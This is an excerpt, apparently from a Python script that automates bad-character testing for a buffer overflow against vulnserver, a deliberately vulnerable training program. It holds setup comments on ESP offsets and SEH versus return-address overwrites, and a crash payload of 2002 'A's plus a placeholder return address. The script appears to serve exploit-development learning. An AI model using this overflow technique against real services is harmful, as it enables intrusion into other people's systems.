...
# 2 - Find an offset from ESP or any register (at crash time) which will lead to the test char buffer (if seh, search before passing exception)
# 3 - Choose between TCP and UDP socket: change in crash_service() and is_service_responsive()
# 4 - Choose between return address overwrite or seh overflow: change in _access_violation_handler(dbg)
# 5 - Change variable at the begining:
#   processName
#   executable
#   listeningPort
#   request_template
...
executable = "C:\\Users\\alex\\Desktop\\vulnserver\\vulnserver.exe" # path the executable to start the process
listeningPort = 9999 # Port of the listening process
...
crashLoad = "A" * 2002 + "{}" + "\x42\x42\x42\x42" 
...
esp_offset = 0x08   # If SEH locate offset before passing exception. [ESP - 0x08] points to our test buffer. To change the offset calculation from - to +, change it in _access_violation_handler(dbg)
